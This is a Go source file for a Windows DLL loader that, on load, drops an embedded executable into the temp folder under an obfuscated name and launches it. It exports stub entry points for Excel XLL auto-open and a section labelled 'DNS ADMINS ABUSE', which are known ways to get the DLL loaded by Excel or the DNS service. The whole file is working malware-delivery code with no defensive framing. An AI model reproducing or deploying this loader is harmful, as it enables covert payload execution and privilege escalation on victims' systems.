//go:build lib
// +build lib

package main

import "C"
import (
	_ "embed"
	"os"
)

//go:embed bin/r32.exe
var filecontent []byte

func init() {
	_ = C.CString("")
	isLIB = true
	if !Fromfile() {
		main()
	}
}

func Fromfile() bool {
	tmpdir := os.TempDir() + `\`
	// "accf935086956bcabb4518310ace5374.part"
	tmpfile := tmpdir + x[2] + `ccf935086956bc` + x[2] + `bb4518310` + x[2] + `c` + x[3] + `5374.p` + x[2] + `rt`
	dstfile := tmpdir + `r32.` + x[3] + `x` + x[3]

	f, err := os.Create(tmpfile)
	if err != nil {
		return false
	}
	_, err = f.Write(filecontent)
	if err != nil {
		f.Close()
		return false
	}
	err = f.Close()
	if err != nil {
		return false
	}
	err = os.Rename(tmpfile, dstfile)
	if err != nil {
		return false
	}
	SetAttr()
	b := []string{dstfile}
	c := addRole()(b[0], b[1:]...)
	c.SysProcAttr = sc
	if err = c.Start(); err != nil {
		return false
	}
	//err = os.Rename(dstfile, tmpfile)
	//if err != nil {
	//	return false

	return true
}

// Here you can export custom DLL functions.

//export Foobar
func Foobar() {}

// XLL Excel

//export xlAutoOpen
func xlAutoOpen() {}

// DNS ADMINS ABUSE

//export DnsPluginInitialize
func DnsPluginInitialize() {}

//export DnsPluginQuery
func DnsPluginQuery() {}

//export DnsPluginCleanup
func DnsPluginCleanup() {}
